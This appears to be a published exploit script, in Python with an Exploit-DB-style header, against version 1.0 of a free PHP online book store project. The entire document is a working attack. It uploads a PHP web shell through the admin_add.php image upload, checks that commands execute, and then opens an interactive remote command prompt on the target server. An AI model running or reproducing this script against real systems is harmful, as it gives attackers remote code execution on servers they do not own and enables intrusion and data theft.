# Exploit Author: Tib3rius
# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/
# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
# Version: 1.0
# Tested on: Ubuntu 16.04
# CVE: N/A

import argparse
import random
import requests
import string
import sys

parser = argparse.ArgumentParser()
parser.add_argument(&#039;url&#039;, action=&#039;store&#039;, help=&#039;The URL of the target.&#039;)
args = parser.parse_args()

url = args.url.rstrip(&#039;/&#039;)
random_file = &#039;&#039;.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

payload = &#039;<?php echo shell_exec($_GET[\&#039;cmd\&#039;]); ?>&#039;

file = {&#039;image&#039;: (random_file + &#039;.php&#039;, payload, &#039;text/php&#039;)}
print(&#039;> Attempting to upload PHP web shell...&#039;)
r = requests.post(url + &#039;/admin_add.php&#039;, files=file, data={&#039;add&#039;:&#039;1&#039;}, verify=False)
print(&#039;> Verifying shell upload...&#039;)
r = requests.get(url + &#039;/bootstrap/img/&#039; + random_file + &#039;.php&#039;, params={&#039;cmd&#039;:&#039;echo &#039; + random_file}, verify=False)

if random_file in r.text:
    print(&#039;> Web shell uploaded to &#039; + url + &#039;/bootstrap/img/&#039; + random_file + &#039;.php&#039;)
    print(&#039;> Example command usage: &#039; + url + &#039;/bootstrap/img/&#039; + random_file + &#039;.php?cmd=whoami&#039;)
    launch_shell = str(input(&#039;> Do you wish to launch a shell here? (y/n): &#039;))
    if launch_shell.lower() == &#039;y&#039;:
        while True:
            cmd = str(input(&#039;RCE $ &#039;))
            if cmd == &#039;exit&#039;:
                sys.exit(0)
            r = requests.get(url + &#039;/bootstrap/img/&#039; + random_file + &#039;.php&#039;, params={&#039;cmd&#039;:cmd}, verify=False)
            print(r.text)
else:
    if r.status_code == 200:
        print(&#039;> Web shell uploaded to &#039; + url + &#039;/bootstrap/img/&#039; + random_file + &#039;.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.&#039;)
    else:
        print(&#039;> Web shell failed to upload! The web server may not have write permissions.&#039;)

